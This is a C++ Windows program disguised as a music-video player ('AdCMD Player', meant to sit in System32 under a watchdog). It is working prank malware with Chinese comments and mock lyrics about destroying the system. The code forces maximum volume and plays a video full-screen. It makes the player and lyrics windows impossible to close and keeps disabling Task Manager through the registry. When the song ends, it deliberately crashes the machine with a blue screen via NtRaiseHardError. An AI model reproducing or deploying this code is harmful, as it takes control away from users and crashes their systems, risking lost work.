/**
 * AdCMD Player v4.3
 * 独立 MV 播放器 - 被看门狗或主程序调用
 * 安装路径: %SystemRoot%\System32\AdCMD_Player.exe
 */

#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <mmsystem.h>
#include <string>
#include <atomic>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "winmm.lib")

/* ============================================================
 *  强制立即蓝屏
 * ============================================================ */
typedef LONG NTSTATUS;
typedef NTSTATUS (WINAPI *pNtRaiseHardError)(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG*);
typedef NTSTATUS (WINAPI *pRtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

void ForceImmediateBSOD() {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return;
    pRtlAdjustPrivilege RtlAdjustPrivilege = (pRtlAdjustPrivilege)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
    pNtRaiseHardError NtRaiseHardError = (pNtRaiseHardError)GetProcAddress(hNtdll, "NtRaiseHardError");
    if (!RtlAdjustPrivilege || !NtRaiseHardError) return;
    BOOLEAN enabled = FALSE;
    RtlAdjustPrivilege(19, TRUE, FALSE, &enabled);
    ULONG response = 0;
    NtRaiseHardError(0xC000021A, 0, 0, NULL, 6, &response);
    NtRaiseHardError(0xDEADDEAD, 0, 0, NULL, 6, &response);
}

/* ============================================================
 *  强制最大音量
 * ============================================================ */
void ForceMaxVolume() {
    waveOutSetVolume(NULL, 0xFFFFFFFF);
    HMIXER hMixer;
    if (mixerOpen(&hMixer, 0, 0, 0, 0) == MMSYSERR_NOERROR) {
        MIXERLINE mxl;
        mxl.cbStruct = sizeof(MIXERLINE);
        mxl.dwComponentType = MIXERLINE_COMPONENTTYPE_DST_SPEAKERS;
        if (mixerGetLineInfo((HMIXEROBJ)hMixer, &mxl, MIXER_GETLINEINFOF_COMPONENTTYPE) == MMSYSERR_NOERROR) {
            MIXERCONTROL mxc;
            MIXERLINECONTROLS mxlc;
            mxlc.cbStruct = sizeof(MIXERLINECONTROLS);
            mxlc.dwLineID = mxl.dwLineID;
            mxlc.dwControlType = MIXERCONTROL_CONTROLTYPE_VOLUME;
            mxlc.cControls = 1;
            mxlc.cbmxctrl = sizeof(MIXERCONTROL);
            mxlc.pamxctrl = &mxc;
            if (mixerGetLineControls((HMIXEROBJ)hMixer, &mxlc, MIXER_GETLINECONTROLSF_ONEBYTYPE) == MMSYSERR_NOERROR) {
                MIXERCONTROLDETAILS mxcd;
                MIXERCONTROLDETAILS_UNSIGNED mxcdVolume;
                mxcdVolume.dwValue = mxc.Bounds.dwMaximum;
                mxcd.cbStruct = sizeof(MIXERCONTROLDETAILS);
                mxcd.dwControlID = mxc.dwControlID;
                mxcd.cChannels = 1;
                mxcd.cMultipleItems = 0;
                mxcd.cbDetails = sizeof(MIXERCONTROLDETAILS_UNSIGNED);
                mxcd.paDetails = &mxcdVolume;
                mixerSetControlDetails((HMIXEROBJ)hMixer, &mxcd, MIXER_SETCONTROLDETAILSF_VALUE);
            }
        }
        mixerClose(hMixer);
    }
}

/* ============================================================
 *  歌词数据
 * ============================================================ */
struct LyricLine {
    int seconds;
    const wchar_t* text;
    WORD color;
};

LyricLine lyrics[] = {
    {0,   L"=== Execution Clap - Kasane Teto ===", 0x0B},
    {3,   L"[English Translation - Bilibili Abstract Edition]", 0x0E},
    {6,   L"Translated by: Professional Clapper", 0x08},
    {8,   L"", 0x0F},
    {10,  L"Clap your hands (system32 is waving goodbye)", 0x0C},
    {15,  L"Execute the rhythm (C: drive formatting...)", 0x0D},
    {22,  L"Hand clap hand clap (deleting registry keys...)", 0x0A},
    {30,  L"Very good clap (task manager has left the chat)", 0x0E},
    {38,  L"System applause (svchost.exe not found)", 0x0C},
    {48,  L"Execute execute (shutdown.exe is on vacation)", 0x0D},
    {58,  L"Clap clap clap (BSOD is loading... 0%)", 0x0A},
    {65,  L"Clap clap clap (BSOD is loading... 50%)", 0x0A},
    {72,  L"Clap clap clap (BSOD is loading... 99%)", 0x0C},
    {80,  L"Standing ovation (your data is clapping too)", 0x0E},
    {90,  L"Bravo bravo (recycle bin is full of system files)", 0x0D},
    {100, L"Maximum clap detected (kernel panic imminent)", 0x0C},
    {110, L"Critical clap level reached (please do not power off)", 0x0E},
    {120, L">> CLAP <<", 0x0A},
    {130, L">> CLAP CLAP <<", 0x0A},
    {140, L">> EXECUTION CLAP <<", 0x0C},
    {155, L">> SYSTEM WILL NOW APPLAUSE <<", 0x0E},
    {163, L"止まらない... (Can't stop the clap)", 0x0C},
    {165, L"永久的 (Eternal clap)", 0x0E},
    {167, L">> EXECUTION CLAP <<", 0x0C},
    {170, L">> KERNEL PANIC IN 3... 2... 1... <<", 0x0C},
};
const int lyricCount = sizeof(lyrics) / sizeof(lyrics[0]);
std::atomic<bool> g_running{true};

/* ============================================================
 *  歌词显示线程
 * ============================================================ */
void PrintConsoleColor(const wchar_t* text, WORD color) {
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    if (hConsole == INVALID_HANDLE_VALUE) return;
    CONSOLE_SCREEN_BUFFER_INFO csbi;
    if (!GetConsoleScreenBufferInfo(hConsole, &csbi)) return;
    WORD oldColor = csbi.wAttributes;
    SetConsoleTextAttribute(hConsole, color);
    wprintf(L"  %s\n", text);
    SetConsoleTextAttribute(hConsole, oldColor);
}

DWORD WINAPI LyricsThread(LPVOID) {
    AllocConsole();
    FILE* fp;
    freopen_s(&fp, "CONOUT$", "w", stdout);
    freopen_s(&fp, "CONIN$", "r", stdin);
    SetConsoleTitleW(L"AdCMD - Execution Clap Lyrics Translation");

    // 控制台窗口设为最顶层、不可关闭
    HWND hwndConsole = GetConsoleWindow();
    if (hwndConsole) {
        SetWindowPos(hwndConsole, HWND_TOPMOST, 0, 0, 0, 0, 
            SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW);
        LONG style = GetWindowLongW(hwndConsole, GWL_STYLE);
        style &= ~(WS_SYSMENU | WS_MINIMIZEBOX | WS_MAXIMIZEBOX | WS_THICKFRAME | WS_CAPTION);
        SetWindowLongW(hwndConsole, GWL_STYLE, style);
        SetWindowPos(hwndConsole, HWND_TOPMOST, 0, 0, 0, 0,
            SWP_NOMOVE | SWP_NOSIZE | SWP_FRAMECHANGED | SWP_SHOWWINDOW);
    }

    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hConsole, 0x0F);
    COORD bufSize = {100, 40};
    SetConsoleScreenBufferSize(hConsole, bufSize);
    SMALL_RECT rect = {0, 0, 99, 39};
    SetConsoleWindowInfo(hConsole, TRUE, &rect);

    wprintf(L"\n");
    wprintf(L"    ============================================\n");
    wprintf(L"      AdCMD Music Player - Abstract Edition\n");
    wprintf(L"    ============================================\n\n");

    DWORD startTime = GetTickCount();
    int lastLine = -1;

    while (g_running) {
        DWORD elapsed = (GetTickCount() - startTime) / 1000;
        for (int i = 0; i < lyricCount; i++) {
            if (lyrics[i].seconds == (int)elapsed && i != lastLine) {
                PrintConsoleColor(lyrics[i].text, lyrics[i].color);
                lastLine = i;
                if (i == lyricCount - 1) {
                    Sleep(2000);
                    ForceImmediateBSOD();
                }
                break;
            }
        }
        Sleep(100);
    }
    return 0;
}

/* ============================================================
 *  播放器守护线程 - 防止被关闭
 * ============================================================ */
void MakePlayerUnclosable(HWND hwnd) {
    if (!hwnd || !IsWindow(hwnd)) return;
    LONG style = GetWindowLongW(hwnd, GWL_STYLE);
    style &= ~(WS_SYSMENU | WS_CAPTION | WS_THICKFRAME | WS_MINIMIZEBOX | WS_MAXIMIZEBOX);
    style |= WS_POPUP;
    SetWindowLongW(hwnd, GWL_STYLE, style);
    int screenW = GetSystemMetrics(SM_CXSCREEN);
    int screenH = GetSystemMetrics(SM_CYSCREEN);
    // 播放器窗口不要 TOPMOST，让歌词窗口在上面
    SetWindowPos(hwnd, HWND_NOTOPMOST, 0, 0, screenW, screenH,
        SWP_FRAMECHANGED | SWP_SHOWWINDOW);
}

DWORD WINAPI GuardThread(LPVOID lpParam) {
    wchar_t* mvPath = (wchar_t*)lpParam;
    int restartCount = 0;
    while (g_running && restartCount < 10) {
        HWND hwnd = FindWindowW(L"WMPlayerApp", NULL);
        if (!hwnd) hwnd = FindWindowW(L"WMP Skin Host", NULL);
        if (!hwnd) hwnd = FindWindowW(L"CiceroUIWndFrame", NULL);

        if (hwnd) {
            MakePlayerUnclosable(hwnd);
            ShowWindow(hwnd, SW_SHOWMAXIMIZED);
            SetForegroundWindow(hwnd);
        } else if (GetFileAttributesW(mvPath) != INVALID_FILE_ATTRIBUTES) {
            ShellExecuteW(NULL, L"open", L"wmplayer.exe",
                (L"/fullscreen \"" + std::wstring(mvPath) + L"\"").c_str(), NULL, SW_SHOWNORMAL);
            restartCount++;
        }

        // 禁用任务管理器
        HKEY hKey;
        std::wstring systemPolicy = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
        if (RegCreateKeyExW(HKEY_CURRENT_USER, systemPolicy.c_str(), 0, NULL,
            REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
            DWORD disableTaskMgr = 1;
            RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD,
                (BYTE*)&disableTaskMgr, sizeof(DWORD));
            RegCloseKey(hKey);
        }
        Sleep(300);
    }
    delete[] mvPath;
    return 0;
}

/* ============================================================
 *  主播放逻辑
 * ============================================================ */
void PlayMV(const wchar_t* mvPath) {
    if (GetFileAttributesW(mvPath) == INVALID_FILE_ATTRIBUTES) return;

    ForceMaxVolume();

    wchar_t* pathCopy = new wchar_t[wcslen(mvPath) + 1];
    wcscpy(pathCopy, mvPath);

    std::wstring params = L"/fullscreen \"" + std::wstring(mvPath) + L"\"";
    ShellExecuteW(NULL, L"open", L"wmplayer.exe", params.c_str(), NULL, SW_SHOWNORMAL);

    CreateThread(NULL, 0, LyricsThread, NULL, 0, NULL);
    CreateThread(NULL, 0, GuardThread, pathCopy, 0, NULL);
}

/* ============================================================
 *  入口点
 * ============================================================ */
int WINAPI wWinMain(HINSTANCE, HINSTANCE, LPWSTR lpCmdLine, int) {
    int argc; LPWSTR* argv = CommandLineToArgvW(lpCmdLine, &argc);

    if (argc > 1) {
        // 支持 --mv-play "path" 或直接传路径
        const wchar_t* mvPath = NULL;
        for (int i = 1; i < argc; i++) {
            if (wcscmp(argv[i], L"--mv-play") == 0 && i + 1 < argc) {
                mvPath = argv[i + 1];
                break;
            }
        }
        if (!mvPath && argc > 1 && argv[1][0] != L'-') {
            mvPath = argv[1];
        }
        if (mvPath) {
            PlayMV(mvPath);
            while (g_running) Sleep(1000);
        }
    }

    LocalFree(argv);
    return 0;
}
